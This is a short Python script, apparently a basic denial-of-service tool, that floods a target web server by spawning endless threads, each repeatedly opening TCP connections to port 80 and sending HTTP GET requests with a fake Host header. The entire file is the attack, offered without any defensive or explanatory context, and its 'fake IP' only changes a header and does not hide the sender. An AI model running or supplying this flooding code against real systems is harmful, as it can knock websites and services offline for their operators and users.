import socket
import threading

target = '127.0.0.1' # target ip
fake_ip = '108.61.128.158'
port = 80

an = 0
def attack():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))
        client.sendto(("GET /" + target + " HTTP/2\r\n").encode('ascii'), (target, port))
        client.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global an
        an += 1
        print(an)
        
        client.close()

while True:
    thread = threading.Thread(target=attack)
    thread.start()    